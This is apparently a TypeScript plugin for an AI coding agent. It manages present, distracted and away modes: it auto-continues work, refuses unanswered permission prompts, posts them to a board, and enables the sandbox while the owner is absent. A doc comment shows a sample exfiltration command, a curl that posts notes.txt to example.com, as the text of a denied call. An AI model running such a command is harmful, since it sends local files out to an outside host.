import { atom, read, update } from 'claude-code'
import type {
  AgentInfo,
  AgentStatus,
  ClassicHookInputs,
  ClassicResultOf,
  EngineInterface,
  Register,
  Timer,
  ToolCallResult,
  TurnCompleteInput,
} from 'claude-code'

import type { AttentionMode } from '../types'
import type { LocalSettings } from './settings-file'
import { parseLocalSettings, renderLocalSettings, withSandboxEnabled } from './settings-file'

const mode = atom({ plugin: 'away', key: 'mode' } as const, 'present')
const isRulesOwed = atom({ plugin: 'away', key: 'isRulesOwed' } as const, false)
const isReportOwed = atom({ plugin: 'away', key: 'isReportOwed' } as const, false)
const isHandoffArmed = atom({ plugin: 'away', key: 'isHandoffArmed' } as const, true)
const postedDenials = atom({ plugin: 'away', key: 'postedDenials' } as const, [])

// handoff's README, "The away plugin", is the other side of these reads and of the /handoff run.
const handoffPhase = { plugin: 'handoff', key: 'phase' } as const
const handoffCeiling = { plugin: 'handoff', key: 'ceilingPercent' } as const

const MODES: readonly AttentionMode[] = ['present', 'distracted', 'away']

const MODE_LABELS: Record<AttentionMode, string> = { present: 'Present', distracted: 'Distracted', away: 'Away' }

const MODE_COLORS: Record<AttentionMode, string | undefined> = { present: undefined, distracted: 'cyan', away: 'yellow' }

const USAGE = 'Usage: /mode present | distracted | away'

// A hidden user row rather than a system prompt section, which would invalidate the cached conversation on every switch.
const RULES: Record<AttentionMode, string> = {
  present: [
    '[mode: present] The owner is at the computer and reading everything; the distracted and away rules no longer',
    'apply. Reply and stop as you normally would. Post a question as a board decision (mcp__board__ask_decision)',
    'rather than asking it in a reply, and put in its context what that reply would have said, so it reads on its own.',
  ].join(' '),
  distracted: [
    '[mode: distracted] The owner is on another monitor, glancing at this session now and then and not reading',
    'replies closely. Keep each reply to one or two lines and give detail only when asked. Post a question as a board',
    'decision (mcp__board__ask_decision) rather than asking it in a reply, then carry on with whatever does not',
    "depend on it. Stop for anything you normally would, and say so in the reply's first line so a glance catches it.",
  ].join(' '),
  away: [
    '[mode: away] The owner is away from the computer and reads nothing until they are back. Keep each reply to a',
    'line at most, or write none. While work remains, go on to the next step rather than ending the turn. Post a',
    'question as a board decision (mcp__board__ask_decision) with the option you would take as the recommended one,',
    'and when that option can be undone, proceed on it without waiting for the answer. Stop only for a risk to the',
    'security or integrity of the machine or a repository, a change that would take hours to unwind, or a hard stop',
    'the owner named. Keep your board tasks current (mcp__board__set_task), since the owner reads them on return.',
  ].join(' '),
}

// board's read_board lists decisions and tasks for the owner side by side; a new kind waiting on the owner is named here too.
const RETURN_PROMPT = [
  '[return] The owner is back. Load mcp__board__read_board through ToolSearch and call it. Then report, briefly and in',
  'this order: the decisions and the tasks for the owner it lists, each with its id and its question or title; what',
  'was done while they were away; and anything that stalled, failed or died. Then end the turn and wait for them.',
].join(' ')

// turn.start finds a continuation's own turn by this mark, and that turn is never continued.
const CONTINUE_MARK = '[away: continue]'

// It leaves the model room to stay stopped, since a turn can end on purpose, as for a security risk.
const CONTINUE_PROMPT = [
  `${CONTINUE_MARK} Your turn ended while the owner is away. If work remains, carry on with the next step. If you`,
  'stopped on purpose, say why in one line and end the turn.',
].join(' ')

const ERROR_CONTINUE_PROMPT = `${CONTINUE_MARK} An API error ended your last turn while the owner is away. Pick the work up again at the step it stopped on.`

// Long enough for an overloaded API to recover, short enough that an unattended session does not sit idle for long.
const ERROR_RETRY_MS = 60_000

// The away rules tell the model to keep going, and a handoff can start only after a turn ends.
const endTurnRow = (ceiling: number) =>
  [
    `[away: end turn] The context window has reached ${ceiling}%. End the turn once the step you are on is done: a`,
    'handoff and a compaction follow, and the work resumes after them.',
  ].join(' ')

// How ask_decision's answer starts, which board's README, "The away plugin", keeps stable.
const POSTED_ID = /^Posted (D\d+)/

const BRACKETED = /\[[^\]]+\]/

const MAX_INPUT_CHARS = 300

const MAX_REASON_CHARS = 150

// The $.agent.list() statuses of a loop that has ended. board's ENDED_STATUSES holds the same list; change both.
const ENDED_STATUSES: ReadonlySet<AgentStatus> = new Set(['completed', 'failed', 'killed'])

const KEPT_SESSIONS = 20

const SESSION_PREFIX = 'session:'

const SANDBOX_PREFIX = 'sandbox:'

// The session id the mode was last loaded for. $.state resets when the id changes, with no session.start to say so.
let boundSessionId: string | undefined

// Whether the main loop's running turn has made a tool call of the model's own; cleared as each of its turns ends.
let hasMainToolCall = false

// The main turn the last continuation prompt started.
let continuationTurnId: string | undefined

// From scheduling a continuation until its own turn ends, so a turn ending in between is not continued as well.
let isContinuationOutstanding = false

let continuationTimer: Timer | undefined

// The main turn last asked to end for a handoff, so a turn of many requests is asked once.
let endAskedTurnId: string | undefined

type DecisionOption = { label: string; description?: string }

type Decision = { question: string; context?: string; options: DecisionOption[] }

/** What a post to the board came to: the decision's id, or why it failed. */
type Posting = { id: string } | { failure: string }

type PermissionRequest = ClassicHookInputs['PermissionRequest']

type PermissionDenied = ClassicHookInputs['PermissionDenied']

// Each post is itself a board tool call, so posting a refused board call would recurse.
const isBoardTool = (tool: string) => tool.startsWith('mcp__board__')

/** `sandboxRoot` is the root whose sandbox the session holds on, which a /cd or a worktree move can leave behind. */
type SavedMode = { mode: AttentionMode; savedAt: number; sandboxRoot?: string }

const storeKey = (sessionId: string) => `${SESSION_PREFIX}${sessionId}`

const isMode = (value: unknown): value is AttentionMode => MODES.includes(value as AttentionMode)

function isSavedMode(value: unknown): value is SavedMode {
  if (typeof value !== 'object' || value === null) return false
  const saved = value as Partial<SavedMode>
  if (typeof saved.savedAt !== 'number') return false
  if (saved.sandboxRoot !== undefined && typeof saved.sandboxRoot !== 'string') return false
  return isMode(saved.mode)
}

async function loadSaved($: EngineInterface, key: string): Promise<SavedMode | undefined> {
  const value: unknown = await $.store.get(key)
  return isSavedMode(value) ? value : undefined
}

async function loadMode($: EngineInterface, sessionId: string): Promise<AttentionMode | undefined> {
  const saved = await loadSaved($, storeKey(sessionId))
  return saved?.mode
}

// Present is the default and keeps no key, so only sessions left distracted or away are stored.
async function save($: EngineInterface, current: AttentionMode) {
  const key = storeKey(await $.session.id())
  if (current === 'present') {
    await $.store.delete(key)
    return
  }
  const saved: SavedMode = { mode: current, savedAt: await $.clock.now() }
  await $.store.set(key, saved)
  await prune($)
}

async function prune($: EngineInterface) {
  const allKeys = await $.store.keys()
  const sessionKeys = allKeys.filter(key => key.startsWith(SESSION_PREFIX))
  if (sessionKeys.length <= KEPT_SESSIONS) return
  const dated: { key: string; savedAt: number }[] = []
  for (const key of sessionKeys) {
    const saved = await loadSaved($, key)
    dated.push({ key, savedAt: saved?.savedAt ?? 0 })
  }
  dated.sort((a, b) => b.savedAt - a.savedAt)
  for (const { key } of dated.slice(KEPT_SESSIONS)) await $.store.delete(key)
}

function showStatus($: EngineInterface, current: AttentionMode) {
  $.ui.status(current === 'present' ? undefined : current)
}

/**
 * Reads the mode in once for each session id. /clear, an in-session resume and backgrounding all move the conversation
 * to a new id without a session.start, and empty $.state as they do, so without this a session moved while away
 * would fall back to present.
 */
async function bind($: EngineInterface) {
  const sessionId = await $.session.id()
  if (sessionId === boundSessionId) return
  const previousId = boundSessionId
  boundSessionId = sessionId

  const saved = await loadMode($, sessionId)
  let current: AttentionMode
  if (saved !== undefined) {
    current = await restore($, saved)
  } else if (previousId === undefined) {
    // A fresh session, or a hot reload, whose state already holds the mode.
    current = await read($, mode)
  } else {
    current = await carryOver($, previousId)
  }
  // A restart or an id change empties $.state, so a session still away owes the return report again.
  if (current === 'away') await update($, isReportOwed, () => true)
  await update($, mode, () => current)
  showStatus($, current)
  // The conversation, not its old id, is what holds the sandbox on now. A restart re-applies it, as the owner may
  // have turned it off since. The new id joins the holders before the old one leaves, so a root the old id held
  // alone is never put back in between.
  if (current === 'away') await holdSandbox($, sessionId)
  if (previousId !== undefined) await releaseSandbox($, previousId)
}

// State still holds the stored mode after a hot reload; any other difference is a session left that way, perhaps long ago.
async function restore($: EngineInterface, saved: AttentionMode): Promise<AttentionMode> {
  const held: AttentionMode = await read($, mode)
  if (saved !== held) $.ui.toast(`Restored ${saved} mode`)
  return saved
}

// The owner's presence did not change with the id, and a /clear's conversation no longer holds the rules row.
async function carryOver($: EngineInterface, previousId: string): Promise<AttentionMode> {
  const carried = (await loadMode($, previousId)) ?? 'present'
  await save($, carried)
  if (carried !== 'present') await update($, isRulesOwed, () => true)
  return carried
}

async function setMode($: EngineInterface, next: AttentionMode): Promise<string> {
  await bind($)
  const previous: AttentionMode = await read($, mode)
  if (next === previous) return await alreadyIn($, next)
  dropContinuation()
  await update($, mode, () => next)
  const sessionId = await $.session.id()
  // Before save, which replaces the record naming the root held.
  if (previous === 'away') await releaseSandbox($, sessionId)
  await save($, next)
  // After save, since the hold names its root in the record save writes.
  if (next === 'away') await holdSandbox($, sessionId)
  showStatus($, next)
  await sendRules($, next)
  if (next === 'away') await update($, isReportOwed, () => true)
  if (next === 'present') await askForReturnReport($)
  return `Mode: ${next}.`
}

// Present typed while present is the owner's way to undo a hold left by a session that died away.
async function alreadyIn($: EngineInterface, current: AttentionMode): Promise<string> {
  const already = `Already ${current}.`
  if (current !== 'present') return already
  if (!(await clearSandbox($))) return already
  return `${already} The sandbox setting a session left behind while away is put back.`
}

/**
 * The sessions holding the sandbox on in one root, and what `sandbox.enabled` held before the first of them did.
 * `earlier` is absent where the file had no such key.
 */
type SandboxHold = { holders: string[]; earlier?: unknown }

const sandboxKey = (root: string) => `${SANDBOX_PREFIX}${root}`

const localSettingsPath = (root: string) => `${root}/.claude/settings.local.json`

function isSandboxHold(value: unknown): value is SandboxHold {
  if (typeof value !== 'object' || value === null) return false
  const { holders } = value as Partial<SandboxHold>
  if (!Array.isArray(holders)) return false
  return holders.every(holder => typeof holder === 'string')
}

async function loadHold($: EngineInterface, key: string): Promise<SandboxHold | undefined> {
  const value: unknown = await $.store.get(key)
  return isSandboxHold(value) ? value : undefined
}

/**
 * Turns the sandbox on in the session root's local settings, where a key overrides only that key, so the rest of the
 * sandbox config still comes from the user's settings. `sessionId` joins the holders, the first holder records the
 * value it found, and the session's record names the root. Needs that record written first.
 */
async function holdSandbox($: EngineInterface, sessionId: string) {
  const root = await $.session.root()
  const saved = await loadSaved($, storeKey(sessionId))
  const heldRoot = saved?.sandboxRoot
  // A session restarted or resumed under another root gives up the hold it left there.
  if (heldRoot !== undefined && heldRoot !== root) await releaseSandbox($, sessionId)
  const key = sandboxKey(root)
  const path = localSettingsPath(root)
  await editLocalSettings($, path, 'The sandbox is off while away', async settings => {
    const hold: SandboxHold = (await loadHold($, key)) ?? { holders: [], earlier: settings.sandbox?.enabled }
    const others = hold.holders.filter(holder => holder !== sessionId)
    // Recorded before the file changes: a file changed with no record would keep the sandbox on for good.
    await $.store.set(key, { ...hold, holders: [...others, sessionId] })
    await recordSandboxRoot($, sessionId, root)
    return withSandboxEnabled(settings, true)
  })
}

/**
 * Takes `sessionId` off the holders of the root its record names, which need not be the session's root now, and puts
 * the earlier value back once none is left.
 */
async function releaseSandbox($: EngineInterface, sessionId: string) {
  const saved = await loadSaved($, storeKey(sessionId))
  const root = saved?.sandboxRoot
  if (root === undefined) return
  const key = sandboxKey(root)
  const hold = await loadHold($, key)
  if (hold === undefined) return
  const holders = hold.holders.filter(holder => holder !== sessionId)
  if (holders.length === 0) {
    await putSandboxBack($, root, hold)
    return
  }
  await $.store.set(key, { ...hold, holders })
}

/**
 * Moves an away session's hold to the root it works in now. A /cd or a worktree move raises no event of its own, and
 * without this the new root's commands would run unsandboxed while away. Only a session away names a root in its
 * record. One whose hold never took names none and is left alone, or a broken file would be toasted at every request.
 */
async function followRoot($: EngineInterface) {
  const sessionId = await $.session.id()
  const saved = await loadSaved($, storeKey(sessionId))
  const heldRoot = saved?.sandboxRoot
  if (heldRoot === undefined) return
  const root = await $.session.root()
  if (heldRoot === root) return
  await holdSandbox($, sessionId)
}

/** Names `root` in the session's record as the root it holds. Present keeps no record, and holds nothing. */
async function recordSandboxRoot($: EngineInterface, sessionId: string, root: string) {
  const key = storeKey(sessionId)
  const saved = await loadSaved($, key)
  if (saved === undefined) return
  await $.store.set(key, { ...saved, sandboxRoot: root })
}

/** Puts back the value a dead session's hold recorded, whoever is listed; whether there was a hold and it is back. */
async function clearSandbox($: EngineInterface): Promise<boolean> {
  const root = await $.session.root()
  const hold = await loadHold($, sandboxKey(root))
  if (hold === undefined) return false
  return putSandboxBack($, root, hold)
}

/** Whether the earlier value is back. One that is not keeps the record, with no holders, for /mode present to retry. */
async function putSandboxBack($: EngineInterface, root: string, hold: SandboxHold): Promise<boolean> {
  const key = sandboxKey(root)
  const path = localSettingsPath(root)
  const consequence = 'The sandbox stays on until /mode present can put it back'
  const isPutBack = await editLocalSettings($, path, consequence, settings => withSandboxEnabled(settings, hold.earlier))
  if (isPutBack) await $.store.delete(key)
  else await $.store.set(key, { ...hold, holders: [] })
  return isPutBack
}

/**
 * Applies `edit` to the local settings at `path`, a missing file counting as `{}`, and writes the result unless it is
 * unchanged, so a file away has nothing to change in keeps its own formatting. Whether the file holds the edit: one
 * that cannot be read, does not hold a JSON object or cannot be written is left as it was, and toasted after
 * `consequence`.
 */
async function editLocalSettings(
  $: EngineInterface,
  path: string,
  consequence: string,
  edit: (settings: LocalSettings) => LocalSettings | Promise<LocalSettings>,
): Promise<boolean> {
  let text: string
  try {
    text = await readLocalSettingsText($, path)
  } catch (err) {
    $.ui.toast(`${consequence}: reading ${path} failed (${String(err)})`)
    return false
  }
  const settings = parseLocalSettings(text)
  if (settings === undefined) {
    $.ui.toast(`${consequence}: ${path} does not hold a JSON object`)
    return false
  }
  const edited = await edit(settings)
  const editedText = renderLocalSettings(edited)
  if (editedText === renderLocalSettings(settings)) return true
  try {
    await $.fs.write(path, editedText)
  } catch (err) {
    $.ui.toast(`${consequence}: writing ${path} failed (${String(err)})`)
    return false
  }
  return true
}

async function readLocalSettingsText($: EngineInterface, path: string): Promise<string> {
  if (!(await $.fs.exists(path))) return '{}'
  return $.fs.read(path)
}

async function askForReturnReport($: EngineInterface) {
  if (!(await read($, isReportOwed))) return
  await update($, isReportOwed, () => false)
  // A submit from inside a command.run hook is refused, since it would wait on the turn the hook holds.
  $.clock.after(1, () => void submit($, RETURN_PROMPT, 'The return report'))
}

async function sendRules($: EngineInterface, current: AttentionMode) {
  await update($, isRulesOwed, () => false)
  await appendRow($, RULES[current], `The ${current} rules`)
}

async function sendOwedRules($: EngineInterface) {
  if (!(await read($, isRulesOwed))) return
  const current: AttentionMode = await read($, mode)
  await sendRules($, current)
}

/** Appends a hidden row to the main conversation, read at a running turn's next request or with the next prompt. */
async function appendRow($: EngineInterface, text: string, what: string) {
  let failure: string | undefined
  try {
    const result = await $.session.append({ message: { type: 'user', content: [{ type: 'text', text }] } })
    failure = result.deny
  } catch (err) {
    failure = String(err)
  }
  if (failure !== undefined) $.ui.toast(`${what} did not reach Claude (${failure}); tell it yourself`)
}

/** Whether the prompt entered the session; one that did not is toasted. */
async function submit($: EngineInterface, text: string, what: string): Promise<boolean> {
  let failure: string | undefined
  try {
    const result = await $.prompt.submit({ text })
    failure = result.drop
  } catch (err) {
    failure = String(err)
  }
  if (failure === undefined) return true
  $.ui.toast(`${what} was not asked for (${failure}); ask Claude yourself`)
  return false
}

async function isHandoffIdle($: EngineInterface): Promise<boolean> {
  const { value } = await $.state.get(handoffPhase)
  // Unset where handoff is not installed.
  return (value ?? 'idle') === 'idle'
}

function scheduleContinuation($: EngineInterface, delayMs: number, text: string) {
  isContinuationOutstanding = true
  // A prompt submitted inside turn.complete would wait on the turn the hook still holds.
  continuationTimer = $.clock.after(delayMs, () => void continueWork($, text))
}

async function continueWork($: EngineInterface, text: string) {
  continuationTimer = undefined
  // A handoff begun during an API error's wait resumes the work itself.
  const isEntered = (await isHandoffIdle($)) && (await submit($, text, 'The continuation'))
  // A prompt that never entered starts no turn whose end would clear the flag, so it would hold back every later one.
  if (!isEntered) isContinuationOutstanding = false
}

// Run on every mode change: whoever changed it is at the keyboard, and a continuation they took off the queue never
// ends a turn.
function dropContinuation() {
  continuationTimer?.cancel()
  continuationTimer = undefined
  isContinuationOutstanding = false
}

/**
 * Whether a loop the main loop spawned is mid-run. Its report or idle notice starts the main loop's next turn, so a
 * turn that ended on one is waiting rather than stopped.
 */
function isMidRunForMainLoop(agent: AgentInfo): boolean {
  // A plugin's spawn reports to that plugin, and a nested spawn to its parent.
  if (agent.spawnedBy !== undefined) return false
  if (agent.parentId !== undefined) return false
  if (ENDED_STATUSES.has(agent.status)) return false
  return agent.status !== 'idle'
}

async function isWaitingOnAgent($: EngineInterface): Promise<boolean> {
  const agents = await $.agent.list()
  return agents.some(isMidRunForMainLoop)
}

/** What the main loop's ending turn leads to while away: nothing, a continuation, or a handoff. */
async function afterMainTurn($: EngineInterface, e: TurnCompleteInput, madeToolCall: boolean) {
  if ((await read($, mode)) !== 'away') return
  // A handoff under way prompts whatever comes after it.
  if (!(await isHandoffIdle($))) return
  // An interrupt is the owner at the keyboard.
  if (e.reason === 'aborted') return
  if (e.reason === 'refusal') return
  // Before the continuation checks: an API error or a turn with no tool call can be the full window itself.
  if ((await dueCeiling($)) !== undefined) {
    await update($, isHandoffArmed, () => false)
    // A command run inside turn.complete is refused, since the turn still holds the session.
    $.clock.after(1, () => void handOff($))
    return
  }
  // The model has been asked once and may have stopped on purpose.
  if (e.turnId === continuationTurnId) return
  if (isContinuationOutstanding) return
  if (await isWaitingOnAgent($)) return
  if (e.reason === 'error') {
    scheduleContinuation($, ERROR_RETRY_MS, ERROR_CONTINUE_PROMPT)
    return
  }
  // A turn with no tool call is a model that answered and is done.
  if (!madeToolCall) return
  scheduleContinuation($, 1, CONTINUE_PROMPT)
}

// A copy of handoff's refreshPercent and estimatePercent: change both, or the two disagree on when the ceiling is reached.
async function fillPercent($: EngineInterface): Promise<number> {
  const { context } = await $.session.usage()
  if (context.percent !== undefined) return context.percent
  // Absent until the first response after a start, a resume or a compaction; /context's local estimate covers it.
  const { context: estimated } = await $.session.usage({ breakdown: 'summary' })
  const tokens = estimated.breakdown?.totalTokens
  if (tokens === undefined) return 0
  return Math.round((100 * tokens) / context.window)
}

/**
 * handoff's ceiling when the fill has reached it and a handoff is due, otherwise undefined. A fill still at the
 * ceiling after away's handoff (a compaction that freed too little, or a handoff that failed) is not due again until
 * it has dropped below, or every turn's end would start another.
 */
async function dueCeiling($: EngineInterface): Promise<number | undefined> {
  const { value: ceiling } = await $.state.get(handoffCeiling)
  // Unset without handoff, and after a session-id change until handoff's next turn.start writes it again.
  if (ceiling === undefined) return undefined
  if ((await fillPercent($)) < ceiling) {
    await update($, isHandoffArmed, () => true)
    return undefined
  }
  return (await read($, isHandoffArmed)) ? ceiling : undefined
}

async function askToEndTurnIfFull($: EngineInterface, turnId: string) {
  if (turnId === endAskedTurnId) return
  if ((await read($, mode)) !== 'away') return
  // A handoff under way has its own prompt asking its turn to end.
  if (!(await isHandoffIdle($))) return
  const ceiling = await dueCeiling($)
  if (ceiling === undefined) return
  endAskedTurnId = turnId
  await appendRow($, endTurnRow(ceiling), 'The request to end the turn for a handoff')
}

/** Runs /handoff, which handoff treats as unattended because away ran it: it compacts and resumes the work. */
async function handOff($: EngineInterface) {
  try {
    await $.command.run({ command: 'handoff' })
  } catch (err) {
    $.ui.toast(`The handoff at the context ceiling did not start (${String(err)}); run /handoff yourself`)
  }
}

const cut = (text: string, max: number) => (text.length > max ? `${text.slice(0, max - 3)}...` : text)

const describeInput = (input: unknown) => cut(JSON.stringify(input) ?? '', MAX_INPUT_CHARS)

async function loopName($: EngineInterface, agentId: string | undefined): Promise<string> {
  if (agentId === undefined) return 'Claude'
  const agents = await $.agent.list()
  const agent = agents.find(listed => listed.id === agentId)
  return agent?.name ?? agent?.type ?? 'a subagent'
}

/** Posts a decision to the board as away's own call, whose answer board delivers to the main session. */
async function postDecision($: EngineInterface, decision: Decision): Promise<Posting> {
  let result: ToolCallResult
  try {
    result = await $.tool.call({ tool: 'mcp__board__ask_decision', ...decision })
  } catch (err) {
    return { failure: String(err) }
  }
  if (result.deny !== undefined) return { failure: result.deny }
  const text = result.text ?? ''
  if (result.isError === true) return { failure: text }
  // The rest of the board's answer is written for the loop that asked, which here is nobody.
  const id = POSTED_ID.exec(text)?.[1]
  if (id === undefined) return { failure: `the board answered "${text}"` }
  return { id }
}

/**
 * Refuses a permission prompt nobody is there to answer and posts it to the board. Only ever a deny, so what runs
 * unattended never widens. What a teammate's refused loop reads:
 *
 * [away: refused] Nobody is at the computer to answer this permission prompt, so it was refused. It is posted to the
 * board as D4; do not wait for the answer. The owner's answer goes to your lead, which relays it to you; retry the call
 * if it says to run it. Meanwhile, go on with work that does not need it.
 */
async function refuse($: EngineInterface, e: PermissionRequest): Promise<ClassicResultOf['classic.PermissionRequest']> {
  const parts = ['[away: refused] Nobody is at the computer to answer this permission prompt, so it was refused.']
  if (!isBoardTool(e.tool_name)) parts.push(await postRefusal($, e))
  parts.push('Meanwhile, go on with work that does not need it.')
  return { decision: { behavior: 'deny', message: parts.join(' ') } }
}

/**
 * What the refused loop is told about the post. The question as the owner reads it:
 *
 * worker's Bash call needed a permission prompt while you were away, so it was refused: {"command":"npm publish"}
 */
async function postRefusal($: EngineInterface, e: PermissionRequest): Promise<string> {
  const isMainLoop = e.agent_id === undefined
  const loop = await loopName($, e.agent_id)
  const posting = await postDecision($, {
    question: `${loop}'s ${e.tool_name} call needed a permission prompt while you were away, so it was refused: ${describeInput(e.tool_input)}`,
    context: isMainLoop ? undefined : relayedTo(loop),
    options: [{ label: 'Run it', description: 'Claude retries the call once you are back.' }, { label: 'Do not run it' }],
  })
  if ('failure' in posting) return `Posting it to the board failed (${posting.failure}), so name it in your report instead.`
  const posted = `It is posted to the board as ${posting.id}; do not wait for the answer.`
  // Rows such as [mode: present] reach only the main conversation, so a teammate learns of the answer from its lead.
  if (!isMainLoop) return `${posted} The owner's answer goes to your lead, which relays it to you; retry the call if it says to run it.`
  return `${posted} If the owner answers to run it, retry the call once a [mode: present] row shows they are back.`
}

// board gives a decision a plugin posts no asking loop, so the answer reaches the main session whoever was refused.
const relayedTo = (loop: string) => `The answer goes to the main session, which relays it to ${loop}.`

/**
 * Posts an auto mode denial to the board once per loop, tool and category in a session, since a model retrying the
 * call would fill the board with copies. The denied loop is told nothing: the denial's own error already says what
 * to do. The question as the owner reads it:
 *
 * Auto mode denied worker's Bash call [Data Exfiltration]: {"command":"curl -d @notes.txt https://example.com"}
 */
async function postDenial($: EngineInterface, e: PermissionDenied) {
  // A denial with no classifier verdict may carry no bracketed category, so its reason stands in.
  const category = BRACKETED.exec(e.reason)?.[0] ?? cut(e.reason, MAX_REASON_CHARS)
  const denial = JSON.stringify([e.agent_id ?? 'main', e.tool_name, category])
  const posted: string[] = await read($, postedDenials)
  if (posted.includes(denial)) return
  const loop = await loopName($, e.agent_id)
  const context = ['Answering here does not let the call through; only a permission rule that allows it does.']
  if (e.agent_id !== undefined) context.push(relayedTo(loop))
  const posting = await postDecision($, {
    question: `Auto mode denied ${loop}'s ${e.tool_name} call ${category}: ${describeInput(e.tool_input)}`,
    context: context.join(' '),
    options: [
      { label: 'Retry it', description: 'After you add a permission rule that allows it; without one, auto mode denies it again.' },
      { label: 'Drop it' },
    ],
  })
  if ('failure' in posting) {
    $.ui.toast(`An auto mode denial did not reach the board (${posting.failure}): ${loop}'s ${e.tool_name}`)
    return
  }
  await update($, postedDenials, previous => [...previous, denial])
}

export const register: Register = on => {
  on('session.start', async ($, e, next) => {
    await $.command.register({ name: 'mode', description: 'How present you are: present, distracted or away' })
    await bind($)
    return next(e)
  })

  on('command.run', { command: 'mode' }, async ($, e) => {
    const requested = e.args.trim().toLowerCase()
    if (requested === '') {
      await bind($)
      const current: AttentionMode = await read($, mode)
      return { text: `Mode: ${current}. ${USAGE}` }
    }
    if (!isMode(requested)) return { text: `Unknown mode "${requested}". ${USAGE}` }
    return { text: await setMode($, requested) }
  })

  on('turn.start', async ($, e, next) => {
    await bind($)
    // A subagent's turn inside the continuation's own would otherwise unmark it. The mark is matched anywhere, since
    // the engine opens a plugin's prompt with a line naming the plugin.
    if (e.agentId === undefined) continuationTurnId = e.text.includes(CONTINUE_MARK) ? e.turnId : undefined
    await sendOwedRules($)
    return next(e)
  })

  // A compaction inside a running turn raises no turn.start before the loop's next request.
  on('turn.step', async function* ($, e, next) {
    if (e.agentId === undefined) {
      await bind($)
      // Here rather than at turn.start: a tool can move the root mid-turn, and a turn's first request comes here too.
      await followRoot($)
      await sendOwedRules($)
      await askToEndTurnIfFull($, e.turnId)
    }
    return yield* next(e)
  })

  on('tool.call', async ($, e, next) => {
    // Another plugin's own call, away's posts to the board among them, is not the model working.
    if (next.origin.plugin === 'engine' && e.agentId === undefined) hasMainToolCall = true
    return next(e)
  })

  on('turn.complete', async ($, e, next) => {
    const result = await next(e)
    if (e.agentId !== undefined) return result
    await bind($)
    const madeToolCall = hasMainToolCall
    hasMainToolCall = false
    if (e.turnId === continuationTurnId) isContinuationOutstanding = false
    await afterMainTurn($, e, madeToolCall)
    return result
  })

  on('classic.PermissionRequest', async ($, e, next) => {
    await bind($)
    if ((await read($, mode)) !== 'away') return next(e)
    return refuse($, e)
  })

  // Auto mode's denials, the classifier's among them, reach the model as the tool's error and raise no permission prompt.
  on('classic.PermissionDenied', async ($, e, next) => {
    const result = await next(e)
    if (isBoardTool(e.tool_name)) return result
    await bind($)
    if ((await read($, mode)) === 'present') return result
    await postDenial($, e)
    return result
  })

  on('session.compact', async ($, e, next) => {
    const result = await next(e)
    // Neither a precompute nor a subagent's compaction replaces the main conversation's rows.
    if (e.trigger === 'precompute') return result
    if (e.agentId !== undefined) return result
    if (result.skip !== undefined) return result
    // Present keeps no row after a compaction, or every compaction of a session never switched would gain one.
    if ((await read($, mode)) !== 'present') await update($, isRulesOwed, () => true)
    return result
  })

  // The band holds one tree, so this draws beneath what the other plugins draw rather than answering without next.
  on('ui.render', { component: 'AbovePrompt' }, async ($, e, next) => {
    const below = await next(e)
    if (e.props.hasSurvey) return below
    const { Box, Button, Text } = $.ui.resolve(e)
    const current: AttentionMode = await read($, mode)
    const others = MODES.filter(other => other !== current)
    return (
      <Box flexDirection="column">
        {below}
        <Box key="away">
          <Text color={MODE_COLORS[current]}>Mode: {current} </Text>
          {others.map(other => (
            <Button key={`mode-${other}`} label={MODE_LABELS[other]} onPress={() => void setMode($, other)} />
          ))}
        </Box>
      </Box>
    )
  })
}
